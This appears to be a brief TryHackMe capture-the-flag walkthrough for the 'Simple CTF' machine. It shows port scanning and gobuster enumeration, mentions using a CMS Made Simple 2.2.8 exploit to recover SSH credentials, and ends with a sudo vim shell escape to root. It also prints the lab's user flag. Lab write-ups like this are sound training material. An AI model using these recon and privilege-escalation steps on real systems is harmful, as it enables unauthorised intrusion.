---
title: Simple CTF
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Simple CTF
  machine on TryHackMe.
slug: simple-ctf
---




```
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1

```


```
❯ gobuster dir -u http://10.201.38.4/ -w /usr/share/dirb/wordlists/small.txt

===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.38.4/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 311] [--> http://10.201.38.4/simple/]


```

> use CMS Made Simple   CMS Made Simple version 2.2.8 after find vaulnerbility use that exploit.py and use it to crack username & pwd and use it to login ssh

```
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
$ ls
user.txt

```


```
$ cd /home
$ 
$ ls
mitch  sunbath
$ 
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

```

> so now know is there something and need to look GTFOBins and after

```
$ sudo /usr/bin/vim -c ':!/bin/sh'


uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
root.txt
# cat root.txt


```